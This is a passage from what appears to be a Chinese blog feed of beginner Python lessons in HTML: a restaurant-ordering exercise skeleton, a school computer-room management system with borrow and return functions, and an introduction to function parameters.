string">$'</span></span><span class="token punctuation">)</span>        my_moneyBox <span class="token operator">=</span> moneyBox<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>my_moneyBox<span class="token punctuation">.</span>menu<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'按下任意键退出程序'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="项目二、智能点菜机器人"><a href="#项目二、智能点菜机器人" class="headerlink" title="项目二、智能点菜机器人"></a>项目二、智能点菜机器人</h1><p><strong>练习：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''项目需求：你是一名享誉全球的考古学家，在三星堆的发掘作业中，你发现了一个奇怪的机器，经过研究，这是距今23亿万年前的亚特兰蒂斯文明所遗留的科技。那时的人类已经可以实现自动点菜的功能了，这无疑是一项颠覆世界的发现。但因年代久远，丢失了一些代码片段，你同时作为中职Python首席科学家，需要补全代码'''</span><span class="token comment"># 定义“菜”类</span><span class="token keyword">class</span> <span class="token class-name">dish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 每道菜有两个属性、菜的名字和价格，每道菜的这两个属性各不相同</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>price<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name         self<span class="token punctuation">.</span>price <span class="token operator">=</span> price    <span class="token comment"># 每道菜具有相同的方法、如你所见，即展示自己的菜名和价格，</span>    <span class="token comment"># 因为它已经是一个成熟的“菜”类了，要学会自己介绍自己</span>    <span class="token keyword">def</span> <span class="token function">show_info</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'菜名：</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>name<span class="token punctuation">}</span></span><span class="token string">,价格</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>price<span class="token punctuation">}</span></span><span class="token string">元'</span></span><span class="token punctuation">)</span> <span class="token comment"># 定义“智能点菜机器人”类</span><span class="token keyword">class</span> <span class="token class-name">orderMachine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 类初始化时，我们希望他有一个初始的菜单，dish_list里管理的应该是“菜”类的实例化对象</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>dish_list<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>dish_list <span class="token operator">=</span> dish_list        <span class="token comment"># 用户点的菜，这个玩意不需要实例化的时候从外面传，因为这个得靠用户自己点，总不能还没点就有东西吧</span>        self<span class="token punctuation">.</span>user_order_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>      <span class="token comment"># 操作菜单（5分）</span>    <span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'今年是超新星纪元305年，欢迎使用亚特兰蒂斯点菜系统：'</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            user_input <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请选择：1、查看菜单 2、增加菜单 3、点菜 4、退出系统：'</span><span class="token punctuation">)</span>            <span class="token comment"># 记得看演示程序运行的效果，然后补全</span>        <span class="token comment"># 查看菜单（5分）</span>    <span class="token keyword">def</span> <span class="token function">show_menu</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 记得看演示程序运行的效果，然后补全</span>    <span class="token keyword">if</span> user_input <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>show_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 增加菜单（5分）</span>    <span class="token comment"># 此功能最好需要输入密码才可以使用，否则用户万一捣乱，往菜单里添加一个“稀饭煮翔”，岂不糟糕？</span>    <span class="token keyword">def</span> <span class="token function">add_dish</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 记得看演示程序运行的效果，然后补全</span>    <span class="token comment"># 点菜（5分）</span>    <span class="token comment"># 消费 100 元及以上享受 8 折优惠，100 元以下享受每满 10 减 1 优惠”的活动（5分）</span>    <span class="token keyword">def</span> <span class="token function">order_dish</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 记得看演示程序运行的效果，然后补全</span>        <span class="token comment"># “菜”类的实例化</span>dish1 <span class="token operator">=</span> dish<span class="token punctuation">(</span><span class="token string">'红烧排骨'</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span>dish2 <span class="token operator">=</span> dish<span class="token punctuation">(</span><span class="token string">'香炸刀鱼'</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span>dish3 <span class="token operator">=</span> dish<span class="token punctuation">(</span><span class="token string">'虾仁炒蛋'</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">)</span>dish_list <span class="token operator">=</span> <span class="token punctuation">[</span>dish1<span class="token punctuation">,</span>dish2<span class="token punctuation">,</span>dish3<span class="token punctuation">]</span><span class="token comment"># “智能点菜机器人”类的实例化</span>my_orderMachine <span class="token operator">=</span> orderMachine<span class="token punctuation">(</span>dish_list<span class="token punctuation">)</span>my_orderMachine<span class="token punctuation">.</span>menu<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="项目三、机房管理系统"><a href="#项目三、机房管理系统" class="headerlink" title="项目三、机房管理系统"></a>项目三、机房管理系统</h1><h2 id="一、定义“房间”类"><a href="#一、定义“房间”类" class="headerlink" title="一、定义“房间”类"></a>一、定义“房间”类</h2><p>“房间”类就两个属性，房间号和房间名</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">room</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>number<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>number <span class="token operator">=</span> number        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name Room203 <span class="token operator">=</span> room<span class="token punctuation">(</span><span class="token number">203</span><span class="token punctuation">,</span><span class="token string">'网络综合布线工作室'</span><span class="token punctuation">)</span> <span class="token comment"># 实例化对象</span><span class="token keyword">print</span><span class="token punctuation">(</span>Room203<span class="token punctuation">.</span>number<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>Room203<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、定义“机房管理系统”类"><a href="#二、定义“机房管理系统”类" class="headerlink" title="二、定义“机房管理系统”类"></a>二、定义“机房管理系统”类</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">room</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>number<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>number <span class="token operator">=</span> number        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name <span class="token keyword">class</span> <span class="token class-name">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 菜单</span>    <span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'欢迎使用海盐商贸学校机房管理系统！！！'</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请选择(1、查看所有机房2、增加机房3、借用机房4、归还机房5、退出)：'</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>showAllRoom<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>addRoom<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>borrowRoom<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'4'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>returnRoom<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'5'</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>HaiYanSystem <span class="token operator">=</span> system<span class="token punctuation">(</span><span class="token punctuation">)</span>HaiYanSystem<span class="token punctuation">.</span>menu<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、查看所有机房"><a href="#三、查看所有机房" class="headerlink" title="三、查看所有机房"></a>三、查看所有机房</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">room</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># state为借出状态，默认未借出</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>number<span class="token punctuation">,</span>name<span class="token punctuation">,</span>state <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>number <span class="token operator">=</span> number        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>state <span class="token operator">=</span> state        <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>state <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            state_text <span class="token operator">=</span> <span class="token string">'未借用'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            state_text <span class="token operator">=</span> <span class="token string">'已借用'</span>        <span class="token keyword">return</span> <span class="token string">'机房房间号{},机房名字{},机房借用状态{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>number<span class="token punctuation">,</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>state_text<span class="token punctuation">)</span> <span class="token keyword">class</span> <span class="token class-name">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        Room203 <span class="token operator">=</span> room<span class="token punctuation">(</span><span class="token string">'203'</span><span class="token punctuation">,</span><span class="token string">'网络综合布线工作室'</span><span class="token punctuation">)</span>        Room204 <span class="token operator">=</span> room<span class="token punctuation">(</span><span class="token string">'204'</span><span class="token punctuation">,</span><span class="token string">'网络搭建机房'</span><span class="token punctuation">)</span>        Room305 <span class="token operator">=</span> room<span class="token punctuation">(</span><span class="token string">'305'</span><span class="token punctuation">,</span><span class="token string">'Python学习机房'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Room_list <span class="token operator">=</span> <span class="token punctuation">[</span>Room203<span class="token punctuation">,</span>Room204<span class="token punctuation">,</span>Room305<span class="token punctuation">]</span>        <span class="token comment"># 菜单</span>    <span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'欢迎使用海盐商贸学校机房管理系统！！！'</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请选择(1、查看所有机房2、增加机房3、借用机房4、归还机房5、退出)：'</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>showAllRoom<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>addRoom<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>borrowRoom<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'4'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>returnRoom<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'5'</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>    <span class="token comment">#查看所有机房</span>    <span class="token keyword">def</span> <span class="token function">showAllRoom</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> Room <span class="token keyword">in</span> self<span class="token punctuation">.</span>Room_list<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>Room<span class="token punctuation">)</span>HaiYanSystem <span class="token operator">=</span> system<span class="token punctuation">(</span><span class="token punctuation">)</span>HaiYanSystem<span class="token punctuation">.</span>menu<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、增加机房"><a href="#四、增加机房" class="headerlink" title="四、增加机房"></a>四、增加机房</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#增加机房</span><span class="token keyword">def</span> <span class="token function">addRoom</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    number <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入房间号：'</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入机房名：'</span><span class="token punctuation">)</span>    new_room <span class="token operator">=</span> room<span class="token punctuation">(</span>number<span class="token punctuation">,</span>name<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>Room_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_room<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、借用机房"><a href="#五、借用机房" class="headerlink" title="五、借用机房"></a>五、借用机房</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#借用机房</span><span class="token keyword">def</span> <span class="token function">borrowRoom</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    number <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要借用的机房房间号：'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> room <span class="token keyword">in</span> self<span class="token punctuation">.</span>Room_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> room<span class="token punctuation">.</span>number <span class="token operator">==</span> number<span class="token punctuation">:</span>            <span class="token keyword">if</span> room<span class="token punctuation">.</span>state <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'成功借用机房'</span><span class="token punctuation">)</span>                room<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'该机房已被借用'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'没有该机房'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、归还机房"><a href="#六、归还机房" class="headerlink" title="六、归还机房"></a>六、归还机房</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#归还机房</span><span class="token keyword">def</span> <span class="token function">returnRoom</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    number <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要归还的机房房间号：'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> room <span class="token keyword">in</span> self<span class="token punctuation">.</span>Room_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> room<span class="token punctuation">.</span>number <span class="token operator">==</span> number<span class="token punctuation">:</span>            <span class="token keyword">if</span> room<span class="token punctuation">.</span>state <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'成功归还机房'</span><span class="token punctuation">)</span>                room<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'该机房没被借用'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'没有该机房'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python基础语法3—鱼子酱要买多少？</title>
      <link href="/2022/02/20/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%953%E2%80%94%E9%B1%BC%E5%AD%90%E9%85%B1%E8%A6%81%E4%B9%B0%E5%A4%9A%E5%B0%91%EF%BC%9F/"/>
      <url>/2022/02/20/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%953%E2%80%94%E9%B1%BC%E5%AD%90%E9%85%B1%E8%A6%81%E4%B9%B0%E5%A4%9A%E5%B0%91%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="一、函数"><a href="#一、函数" class="headerlink" title="一、函数"></a>一、函数</h2><h3 id="1-函数的定义与参数传递"><a href="#1-函数的定义与参数传递" class="headerlink" title="1.函数的定义与参数传递"></a>1.函数的定义与参数传递</h3><p>先来创建一个最基本的函数吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">study</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'我爱学习编程'</span><span class="token punctuation">)</span> study<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以传递一些参数进去</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">study</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>school<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的名字叫做</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">，我在</span><span class="token interpolation"><span class="token punctuation">{</span>school<span class="token punctuation">}</span></span><span class="token string">学习编程'</span></span><span class="token punctuation">)</span> study<span class="token punctuation">(</span><span class="token string">'小明'</span><span class="token punctuation">,</span><span class="token string">'海盐商贸学校'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当然，参数应该按照顺序放进去，不信就试一下下面这段代码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">study</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>school<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的名字叫做</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">，我在</span><span class="token interpolation"><span class="token punctuation">{</span>school<span class="token punctuation">}</span></span><span class="token string">学习编程'</span></span><span class="token punctuation">)</span> study<span class="token punctuation">(</span><span class="token string">'海盐商贸学校'</span><span class="token punctuation">,</span><span class="token string">'小明'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们也可以对参数进行指定，不按照顺序传递。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">study</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>school<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的名字叫做</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">，我在</span><span class="token interpolation"><span class="token punctuation">{</span>school<span class="token punctuation">}</span></span><span class="token string">学习编程'</span></span><span class="token punctuation">)</span> study<span class="token punctuation">(</span>school<span class="token operator">=</span><span class="token string">'海盐商贸学校'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'小明'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>还可以给参数设置默认的值</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">study</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>school <span class="token operator">=</span> <span class="token string">'海盐商贸学校'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的名字叫做</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">，我在</span><span class="token interpolation"><span class="token punctuation">{</span>school<span class="token punctuation">}</span></span><span class="token string">学习编程'</span></span><span class="token punctuation">)</span> study<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'小明'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>默认参数的值是可以修改的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">study</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>school <span class="token operator">=</span> <span class="token string">'海盐商贸学校'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的名字叫做</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">，我在</span><span class="token interpolation"><span class="token punctuation">{</span>school<span class="token punctuation">}</span></span><span class="token string">学习编程'</span></span><span class="token punctuation">)</span> study<span class="token punctuation">(</span><span class="token string">'小明'</span><span class="token punctuation">,</span><span class="token string">'清华大学'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果不确定参数的数量，我们可以设置一种特殊的不定长参数。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">study</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>school<span class="token punctuation">,</span><span class="token operator">*</span>course<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的名字叫做</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">，我在</span><span class="token interpolation"><span class="token punctuation">{</span>school<span class="token punctuation">}</span></span><span class="token string">学习</span><span class="token interpolation"><span class="token punctuation">{</span>course<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span> study<span class="token punctuation">(</span><span class="token string">'小明'</span><span class="token punctuation">,</span><span class="token string">'海盐商贸学校'</span><span class="token punctuation">,</span><span class="token string">'编程'</span><span class="token punctuation">,</span><span class="token string">'数学'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这种不定长参数会返回一种元组类型，如果你觉得不好看，我们可以用循环将其依次取出。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">study</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>school<span class="token punctuation">,</span><span class="token operator">*</span>course<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> course<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的名字叫做</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">，我在</span><span class="token interpolation"><span class="token punctuation">{</span>school<span class="token punctuation">}</span></span><span class="token string">学习</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span> study<span class="token punctuation">(</span><span class="token string">'小明'</span><span class="token punctuation">,</span><span class="token string">'海盐商贸学校'</span><span class="token punctuation">,</span><span class="token string">'编程'</span><span class="token punctuation">,</span><span class="token string">'数学'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>🐱‍🐉<strong>试一试，定义一个函数，要求把第一个参数设置为不定长参数。</strong></p><p>看一下prints()函数的文档，第一个参数是不是就是不定长参数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'我'</span><span class="token punctuation">,</span> <span class="token string">'正在'</span><span class="token punctuation">,</span> <span class="token string">'学习编程'</span><span class="token punctuation">,</span> sep <span class="token operator">=</span> <span class="token string">'+'</span><span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'我'</span><span class="token punctuation">,</span> <span class="token string">'正在'</span><span class="token punctuation">,</span> <span class="token string">'学习编程'</span><span class="token punctuation">,</span> sep <span class="token operator">=</span> <span class="token string">'+'</span><span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-函数的返回值"><a href="#2-函数的返回值" class="headerlink" 